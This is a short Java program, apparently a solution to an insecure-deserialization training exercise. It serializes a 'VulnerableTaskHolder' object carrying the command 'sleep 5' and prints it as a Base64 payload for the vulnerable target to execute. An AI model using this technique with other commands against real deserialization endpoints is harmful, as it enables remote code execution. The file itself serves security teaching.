package com.example.sample;

import org.dummy.insecure.framework.VulnerableTaskHolder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws IOException {
        // Create a target object
        VulnerableTaskHolder go = new VulnerableTaskHolder("Wait for 5 sec", "sleep 5");

        // Serialize it
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(go);
        oos.flush();

        // Print a base 64 representation of the serialized object
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
